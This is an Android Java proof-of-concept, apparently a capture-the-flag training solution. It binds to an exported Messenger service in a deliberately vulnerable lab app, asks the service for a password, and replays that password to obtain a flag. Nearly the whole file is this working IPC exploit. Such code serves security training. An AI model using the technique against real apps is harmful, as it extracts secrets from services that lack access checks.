package io.hextree.services_pocs;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import java.util.Set;

public class MainActivity extends AppCompatActivity {
    Messenger clientMessenger;
    Messenger messenger;
    String receivedPassword;

    private class IncomingHandler extends Handler {
        public IncomingHandler(Looper looper) {
            super(looper);
        }

        @Override
        public void handleMessage(@NonNull Message msg) {
            Log.i("Client Message Handler", "Message received from the service. What: " + msg.what);
            Bundle bundle = msg.getData();
            if (bundle != null) {
                Set<String> keys = bundle.keySet();
                for (String key : keys) {
                    Log.i("Client Message Handler", "Bundle key: " + key + " value: " + bundle.get(key));
                }

                if (msg.what == 2) { // MSG_GET_PASSWORD response
                    receivedPassword = bundle.getString("password");
                    Log.i("Client Message Handler", "Received password: " + receivedPassword);
                    if (receivedPassword != null) {
                        sendGetFlag();
                    }
                } else if (msg.what == 1) { // MSG_ECHO response
                    Log.i("Client Message Handler", "Echo response received");
                } else if (msg.what == 3) { // MSG_GET_FLAG response
                    Log.i("Client Message Handler", "Flag response received");
                }
            } else {
                Log.i("Client Message Handler", "Bundle is null");
            }
        }
    }

    ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            messenger = new Messenger(service);
            sendEcho();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            messenger = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        clientMessenger = new Messenger(new IncomingHandler(Looper.getMainLooper()));

        findViewById(R.id.button).setOnClickListener(v -> {
            Intent intent1 = new Intent();
            intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
            bindService(intent1, serviceConnection, Context.BIND_AUTO_CREATE);
        });
    }

    private void sendEcho() {
        try {
            Message msg = Message.obtain(null, 1); // MSG_ECHO
            Bundle bundle = new Bundle();
            bundle.putString("echo", "give flag");
            msg.setData(bundle);
            msg.replyTo = clientMessenger; // Added replyTo
            messenger.send(msg);
            sendGetPassword();
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    private void sendGetPassword() {
        try {
            Message msg = Message.obtain(null, 2); // MSG_GET_PASSWORD

            // If the service expected msg.obj = "request", it's likely it expects
            // the data in a Bundle under some key. Let's try "password" or "request".
            Bundle bundle = new Bundle();
            bundle.putString("password", "request");
            msg.setData(bundle);
            msg.obj = bundle;
            msg.replyTo = clientMessenger;
            messenger.send(msg);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    private void sendGetFlag() {
        try {
            Message msg = Message.obtain(null, 3); // MSG_GET_FLAG
            Bundle bundle = new Bundle();
            bundle.putString("password", receivedPassword);
            msg.setData(bundle);
            msg.replyTo = clientMessenger;
            messenger.send(msg);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }
}
